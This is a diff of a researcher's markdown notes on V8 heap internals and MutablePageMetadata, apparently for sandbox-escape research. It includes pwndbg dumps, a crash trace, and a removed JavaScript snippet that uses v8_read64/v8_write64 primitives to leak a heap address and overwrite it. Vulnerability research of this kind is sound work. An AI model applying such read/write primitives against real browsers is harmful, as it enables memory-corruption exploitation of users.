@@ -210,26 +210,8 @@ They moved all of trusted data to readonly region.
 
 ### Understanding Mutable Page Metadata
 
-- heap_base
-```js
-// heap_base
-let ofs1 = 0x48;
-let leak_addr = v8_read64(ofs1);
-let ofs2 = leak_addr & 0xffffffffn;
-let ofs3 = leak_addr & 0xffffffff00000000n;
-let leak_addr2 = ofs3 + 0x48n;
-console.log("addr[0x" + ofs1.toString(16) + "] = 0x" + leak_addr.toString(16));
-console.log("ofs2: ", ofs2.toString(16));
-console.log("ofs2 value: ", v8_read64(ofs2).toString(16));
-console.log("before writing to addr: 0x"+ leak_addr2.toString(16));
-// 0x35b200000048
+V8 uses a garbage collector to manage memory allocation and deallocation. The heap in v8 is divied into different spaces (e.g., new space, old space, code space), and each of space consists of memory chunks or pages. Managing these pages involves maintaining metadata about their state, usage, and other attributes.  
 
-%SystemBreak();
-
-v8_write64(ofs2, 0x4141414142424242n);
-%SystemBreak();
-```
-**what is heap metadata ptmalloc on v8?**
 ```
 #
 # Fatal error in ../../src/heap/mutable-page-inl.h, line 57
@@ -252,10 +234,7 @@ v8_write64(ofs2, 0x4141414142424242n);
 #12 0x0000555555576c9a in _start ()
 ```
 
-`String::Flatten`???
-
 ```cpp
-before writing to addr: 0x345200040000
 
 pwndbg> p s
 $10 = {
@@ -296,7 +275,7 @@ Stacktrace:
 ```
 
 ```cpp
-0xd2500040000
+
 // normal page 
 pwndbg> x/40wx 0x00001e4800340000
 0x1e4800340000:	0x00000012	0x00000000	0x0000000d	0xbeadbeef
@@ -336,16 +315,9 @@ seacloud at ~/Desktop/v8/v8 ❯ cat /proc/3901929/maps | head -n 50
 3b3700040000-3b3700080000 rw-p 00000000 00:00 0 
 3b3700080000-3b3740000000 ---p 00000000 00:00 0 
 555555554000-555555638000 r--p 00000000 08:03 8704715                    /home/vult/Desktop/v8/v8/out/debug/d8
-555555638000-5555556e7000 r-xp 000e3000 08:03 8704715                    /home/vult/Desktop/v8/v8/out/debug/d8
-5555556e7000-5555556e9000 r--p 00191000 08:03 8704715                    /home/vult/Desktop/v8/v8/out/debug/d8
-5555556e9000-5555556eb000 rw-p 00192000 08:03 8704715                    /home/vult/Desktop/v8/v8/out/debug/d8
-5555556eb000-5555557e7000 rw-p 00000000 00:00 0                          [heap]
 
-///
-0x1c4300040000
-(v8::internal::Space *) 0x5555556f5660
 // ../../src/heap/memory-allocator.cc:380
-pwndbg> p *(v8::internal::MutablePageMetadata *) 0x5555557670f0
+pwndbg> p *(v8::internal::MutablePageMetadata *) 0x5555557670f0 // out of sandbox
 $58 = {
   <v8::internal::MemoryChunkMetadata> = {
     reservation_ = {
@@ -588,3 +560,6 @@ pwndbg> find 0x1e700000000,0x1e800000000,0x1e700
 ## Conclusion 
 
 Heap Meta Data, pointer,...?
+
+![V8 MutablePageMetadata](v8_sandbox.drawio.png)
+
